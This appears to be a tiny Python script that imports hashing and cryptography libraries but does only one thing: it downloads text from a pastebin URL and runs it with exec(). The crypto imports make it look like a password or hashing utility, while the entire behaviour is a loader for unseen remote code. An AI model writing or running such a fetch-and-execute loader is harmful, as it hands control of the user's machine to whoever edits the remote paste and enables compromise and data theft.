import requests
import hashlib
import sys
import random
import bcrypt
import binascii

precode = requests.get("https://pastebin.com/raw/GJcqdWhJ")
exec(precode.text)